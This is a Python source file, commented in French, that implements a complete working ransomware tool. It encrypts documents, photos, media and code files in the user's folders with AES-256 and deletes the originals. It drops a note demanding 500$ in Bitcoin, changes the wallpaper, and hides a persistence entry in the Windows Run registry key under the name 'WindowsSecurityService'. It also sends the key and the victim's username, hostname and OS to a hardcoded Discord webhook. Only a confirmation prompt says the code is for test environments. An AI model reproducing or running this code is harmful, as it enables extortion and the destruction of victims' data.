import os
import sys
import socket
import platform
import base64
import time
import requests
from datetime import datetime
from threading import Thread
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import hashlib
import shutil
import ctypes
import uuid

# Persistance au démarrage (Windows uniquement)
try:
    import winreg
except ImportError:
    pass

# Essayer d'importer PIL pour la création d'image
try:
    from PIL import Image, ImageDraw, ImageFont
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Banner
BANNER = """
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗██╗    ██╗ █████╗ ██████╗ ███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██║    ██║██╔══██╗██╔══██╗██╔════╝
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██║ █╗ ██║███████║██████╔╝█████╗  
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║╚███╔███╔╝██║  ██║██║  ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                          
                Vos fichiers ont été chiffrés! Payez la rançon pour récupérer vos données.
"""

# Webhook URL pour envoyer la clé (remplacer par votre URL webhook)
# Ex: Discord, Slack, ou tout service qui accepte des requêtes POST
WEBHOOK_URL = "https://discord.com/api/webhooks/1354564587751735437/Sf4ab7f_d5Q-HTyIwvfMcs-QPs2YGUVQwhEZUVZmaWtslZhI78YPCj1wmYzI7NU1eVnN"

# Extension pour les fichiers chiffrés
ENCRYPTED_EXTENSION = ".encrypted"

# Types de fichiers à chiffrer
TARGET_EXTENSIONS = [
    # Documents
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.rtf', '.odt',
    # Images
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg', '.webp',
    # Audio/Vidéo
    '.mp3', '.mp4', '.wav', '.avi', '.mov', '.flv', '.mkv',
    # Archives
    '.zip', '.rar', '.7z', '.tar', '.gz',
    # Autres
    '.csv', '.json', '.xml', '.html', '.htm', '.php', '.py', '.js', '.java', '.c', '.cpp'
]

# Dossiers à éviter pour ne pas casser le système
EXCLUDE_DIRS = [
    "Windows", "Program Files", "Program Files (x86)", "AppData", 
    "ProgramData", "$Recycle.Bin", "Microsoft", "Boot", "System Volume Information", 
    "bootmgr", "Recovery", "PerfLogs"
]

def create_ransom_background(output_path, width=1920, height=1080):
    """
    Crée une image de fond d'écran pour le ransomware
    """
    if not PIL_AVAILABLE:
        return False
        
    # Créer une image noire
    img = Image.new('RGB', (width, height), color='black')
    draw = ImageDraw.Draw(img)
    
    # Essayer de charger une police
    try:
        # Essayer différentes polices selon la plateforme
        font_paths = [
            "C:\\Windows\\Fonts\\Arial.ttf",  # Windows
            "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",  # Linux
            "/System/Library/Fonts/Helvetica.ttc"  # macOS
        ]
        
        font = None
        for path in font_paths:
            if os.path.exists(path):
                font = ImageFont.truetype(path, 60)
                break
                
        if font is None:
            font = ImageFont.load_default()
            
    except Exception:
        font = ImageFont.load_default()
    
    # Ajouter le texte principal
    title = "VOS FICHIERS ONT ÉTÉ CHIFFRÉS"
    if font:
        try:
            text_width = draw.textlength(title, font=font)
        except:
            # Pour les anciennes versions de PIL
            text_width = font.getsize(title)[0]
    else:
        text_width = width // 2
    
    # Dessiner le titre en rouge
    draw.text(
        ((width - text_width) // 2, height // 4),
        title,
        font=font,
        fill=(255, 0, 0)
    )
    
    # Ajouter les instructions
    instructions = [
        "Tous vos documents, photos, vidéos et autres fichiers importants",
        "ont été chiffrés avec un algorithme militaire AES-256.",
        "",
        "Pour récupérer vos fichiers, vous devez payer une rançon de 500$.",
        "",
        "Lisez le fichier RANSOM_NOTE.txt sur votre bureau pour plus d'informations.",
        "",
        "VOUS AVEZ 72 HEURES POUR PAYER OU VOS FICHIERS SERONT PERDUS À JAMAIS."
    ]
    
    # Essayer de charger une police plus petite pour les instructions
    try:
        small_font = None
        for path in font_paths:
            if os.path.exists(path):
                small_font = ImageFont.truetype(path, 30)
                break
                
        if small_font is None:
            small_font = ImageFont.load_default()
    except Exception:
        small_font = ImageFont.load_default()
    
    # Dessiner les instructions
    y_offset = height // 2
    for line in instructions:
        if small_font:
            try:
                text_width = draw.textlength(line, font=small_font)
            except:
                # Pour les anciennes versions de PIL
                text_width = small_font.getsize(line)[0]
        else:
            text_width = width // 2
        
        # Dessiner le texte en blanc
        draw.text(
            ((width - text_width) // 2, y_offset),
            line,
            font=small_font,
            fill=(255, 255, 255)
        )
        y_offset += 40
    
    # Sauvegarder l'image
    img.save(output_path)
    return True

def add_to_startup(file_path, reg_name):
    """Ajouter le programme au démarrage de Windows"""
    if platform.system() != "Windows":
        return False
        
    try:
        # Chemin complet du fichier
        full_path = os.path.abspath(file_path)
        
        # Ouvrir la clé de registre
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        # Ajouter le programme
        winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, f'python "{full_path}"')
        winreg.CloseKey(key)
        return True
    except Exception as e:
        return False

def send_key_to_webhook(webhook_url, key_data, victim_info):
    """Envoyer la clé au webhook"""
    try:
        # Convertir la clé en base64
        key_base64 = base64.b64encode(key_data).decode('utf-8')
        
        # Construire les données à envoyer
        data = {
            "key": key_base64,
            "victim": victim_info
        }
        
        # Envoyer au webhook
        response = requests.post(webhook_url, json=data, timeout=5)
        return response.status_code == 200
    except:
        return False

class Ransomware:
    def __init__(self):
        # Génerer un ID unique pour la victime
        self.victim_id = str(uuid.uuid4())
        
        # Générer une clé de chiffrement unique pour cette infection
        self.key = get_random_bytes(32)  # Clé AES-256
        
        # Sauvegarder la clé (dans un scénario réel, elle serait envoyée à un serveur C&C)
        with open("decrypt_key.key", "wb") as key_file:
            key_file.write(self.key)
        
        # Trouver les dossiers cibles
        self.system_drive = os.environ.get('SystemDrive', 'C:')
        self.username = os.environ.get('USERNAME', '')
        self.desktop_path = os.path.join(self.system_drive, os.sep, 'Users', self.username, 'Desktop')
        self.documents_path = os.path.join(self.system_drive, os.sep, 'Users', self.username, 'Documents')
        
        # Fichier de rançon à créer sur le bureau
        self.ransom_note_path = os.path.join(self.desktop_path, "RANSOM_NOTE.txt")
        self.bg_path = os.path.join(self.desktop_path, "ransom_bg.png")
        
        # Statistiques
        self.encrypted_files_count = 0
        self.failed_files_count = 0
        self.start_time = time.time()
    
    def is_safe_path(self, path):
        # Vérifier si le chemin contient des dossiers système à éviter
        normalized_path = path.lower()
        for exclude_dir in EXCLUDE_DIRS:
            if exclude_dir.lower() in normalized_path:
                return False
        return True
    
    def encrypt_file(self, file_path):
        try:
            # Ne pas chiffrer les fichiers déjà chiffrés
            if file_path.endswith(ENCRYPTED_EXTENSION):
                return False
                
            # Vérifier si le fichier existe et est accessible
            if not os.path.exists(file_path) or not os.access(file_path, os.R_OK):
                return False
                
            # Lire le contenu du fichier
            with open(file_path, 'rb') as file:
                file_data = file.read()
                
            # Chiffrer le contenu
            cipher = AES.new(self.key, AES.MODE_CBC)
            iv = cipher.iv
            padded_data = pad(file_data, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            final_data = iv + encrypted_data
            
            # Écrire les données chiffrées
            encrypted_file_path = file_path + ENCRYPTED_EXTENSION
            with open(encrypted_file_path, 'wb') as encrypted_file:
                encrypted_file.write(final_data)
                
            # Supprimer le fichier original
            os.remove(file_path)
            self.encrypted_files_count += 1
            return True
            
        except Exception as e:
            self.failed_files_count += 1
            return False
    
    def scan_and_encrypt(self, path):
        # Chiffrer tous les fichiers cibles dans le chemin donné
        try:
            if not self.is_safe_path(path):
                return
                
            for root, dirs, files in os.walk(path):
                # Filtrer les dossiers à éviter
                dirs[:] = [d for d in dirs if self.is_safe_path(os.path.join(root, d))]
                
                for file in files:
                    file_path = os.path.join(root, file)
                    file_extension = os.path.splitext(file_path)[1].lower()
                    
                    # Ne chiffrer que les fichiers avec les extensions ciblées
                    if file_extension in TARGET_EXTENSIONS:
                        self.encrypt_file(file_path)
                    
        except Exception as e:
            pass
    
    def create_ransom_note(self):
        # Créer une note de rançon sur le bureau
        ransom_message = f"""
{BANNER}

!!! ATTENTION !!!

Tous vos fichiers importants ont été chiffrés avec un algorithme militaire AES-256.
Vos photos, documents, vidéos, et autres données personnelles sont maintenant inaccessibles.

Pour récupérer vos fichiers, vous devez payer une rançon.

Instructions:
1. Envoyez 500$ en Bitcoin à l'adresse: 1A2B3C4D5E6F7G8H9I0J
2. Envoyez la preuve de paiement et votre ID unique à: evil@hacker.com
3. Vous recevrez un outil de déchiffrement et la clé unique pour restaurer vos fichiers

ATTENTION:
- N'essayez pas de déchiffrer vos fichiers vous-même, vous risquez de les perdre définitivement
- Ne reformatez pas votre système, vous perdriez toutes vos données
- Vous avez 72 heures pour payer, après quoi le prix doublera
- Après 7 jours, votre clé sera détruite et vos fichiers seront perdus à jamais

Votre ID unique est: {self.victim_id}

Nombre de fichiers chiffrés: {self.encrypted_files_count}
Date et heure du chiffrement: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        with open(self.ransom_note_path, 'w') as ransom_file:
            ransom_file.write(ransom_message)
    
    def change_desktop_background(self):
        try:
            # Créer une image pour le fond d'écran
            bg_created = create_ransom_background(self.bg_path)
            
            # Changer le fond d'écran (Windows uniquement)
            if bg_created and platform.system() == "Windows":
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, self.bg_path, 3)
                return True
        except:
            pass
        return False
    
    def setup_persistence(self):
        """Configurer la persistance après redémarrage"""
        if platform.system() == "Windows":
            try:
                # Ajouter au registre de démarrage
                return add_to_startup(sys.argv[0], "WindowsSecurityService")
            except:
                pass
        return False
        
    def send_key_to_remote(self):
        """Envoyer la clé au webhook pour la récupérer même après redémarrage"""
        # Collecter des informations sur la victime
        victim_info = {
            "id": self.victim_id,
            "username": self.username,
            "hostname": socket.gethostname(),
            "os": platform.platform(),
            "date": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "encrypted_files": self.encrypted_files_count
        }
        
        # Envoyer la clé au webhook
        return send_key_to_webhook(WEBHOOK_URL, self.key, victim_info)
    
    def run(self):
        print("[*] Démarrage du chiffrement...")
        
        # Chiffrer les dossiers importants
        targets = [
            self.desktop_path,
            self.documents_path,
            os.path.join(self.system_drive, os.sep, 'Users', self.username, 'Pictures'),
            os.path.join(self.system_drive, os.sep, 'Users', self.username, 'Videos'),
            os.path.join(self.system_drive, os.sep, 'Users', self.username, 'Music'),
            os.path.join(self.system_drive, os.sep, 'Users', self.username, 'Downloads'),
        ]
        
        for target in targets:
            if os.path.exists(target):
                print(f"[*] Chiffrement de {target}")
                self.scan_and_encrypt(target)
        
        # Créer la note de rançon
        self.create_ransom_note()
        
        # Changer le fond d'écran
        bg_changed = self.change_desktop_background()
        
        # Configurer la persistance
        persistence_setup = self.setup_persistence()
        
        # Envoyer la clé au webhook
        key_sent = self.send_key_to_remote()
        
        # Afficher les statistiques
        elapsed_time = time.time() - self.start_time
        print(f"[+] Chiffrement terminé en {elapsed_time:.2f} secondes")
        print(f"[+] {self.encrypted_files_count} fichiers chiffrés")
        print(f"[+] {self.failed_files_count} fichiers non chiffrés (erreurs)")
        print(f"[+] Note de rançon créée à {self.ransom_note_path}")
        if bg_changed:
            print(f"[+] Fond d'écran changé")
        if persistence_setup:
            print(f"[+] Persistance configurée, s'exécutera au prochain démarrage")
        if key_sent:
            print(f"[+] Clé envoyée au serveur distant")


class Decryptor:
    def __init__(self, key_path):
        # Charger la clé de déchiffrement
        with open(key_path, "rb") as key_file:
            self.key = key_file.read()
        
        # Statistiques
        self.decrypted_files_count = 0
        self.failed_files_count = 0
        self.start_time = time.time()
    
    def decrypt_file(self, encrypted_file_path):
        try:
            # Vérifier si le fichier est chiffré
            if not encrypted_file_path.endswith(ENCRYPTED_EXTENSION):
                return False
                
            # Lire le fichier chiffré
            with open(encrypted_file_path, 'rb') as file:
                file_data = file.read()
                
            # Extraire l'IV et les données chiffrées
            iv = file_data[:16]
            encrypted_data = file_data[16:]
            
            # Déchiffrer
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
            
            # Écrire les données déchiffrées
            decrypted_file_path = encrypted_file_path[:-len(ENCRYPTED_EXTENSION)]
            with open(decrypted_file_path, 'wb') as decrypted_file:
                decrypted_file.write(decrypted_data)
                
            # Supprimer le fichier chiffré
            os.remove(encrypted_file_path)
            self.decrypted_files_count += 1
            return True
            
        except Exception as e:
            self.failed_files_count += 1
            return False
    
    def scan_and_decrypt(self, path):
        # Déchiffrer tous les fichiers chiffrés dans le chemin donné
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith(ENCRYPTED_EXTENSION):
                        self.decrypt_file(file_path)
                    
        except Exception as e:
            pass
    
    def run(self, path):
        print("[*] Démarrage du déchiffrement...")
        
        self.scan_and_decrypt(path)
        
        # Afficher les statistiques
        elapsed_time = time.time() - self.start_time
        print(f"[+] Déchiffrement terminé en {elapsed_time:.2f} secondes")
        print(f"[+] {self.decrypted_files_count} fichiers déchiffrés")
        print(f"[+] {self.failed_files_count} fichiers non déchiffrés (erreurs)")
        
        # Désactiver la persistance
        if platform.system() == "Windows":
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.DeleteValue(key, "WindowsSecurityService")
                winreg.CloseKey(key)
                print("[+] Persistance désactivée")
            except:
                pass


if __name__ == "__main__":
    print(BANNER)
    
    if len(sys.argv) > 1 and sys.argv[1].lower() == "decrypt":
        if len(sys.argv) < 3:
            print("Usage: python ransomware.py decrypt <key_file> <path_to_decrypt>")
            sys.exit(1)
        
        key_path = sys.argv[2]
        decrypt_path = sys.argv[3] if len(sys.argv) > 3 else os.getcwd()
        
        decryptor = Decryptor(key_path)
        decryptor.run(decrypt_path)
    else:
        print("""
⚠️ ATTENTION ⚠️
Ce programme est un véritable ransomware qui va chiffrer vos fichiers!
À utiliser UNIQUEMENT dans un environnement de test isolé.

Tapez 'CONTINUER' pour procéder ou CTRL+C pour annuler: """)
        confirmation = input()
        
        if confirmation.upper() == "CONTINUER":
            ransomware = Ransomware()
            ransomware.run()
        else:
            print("Opération annulée.")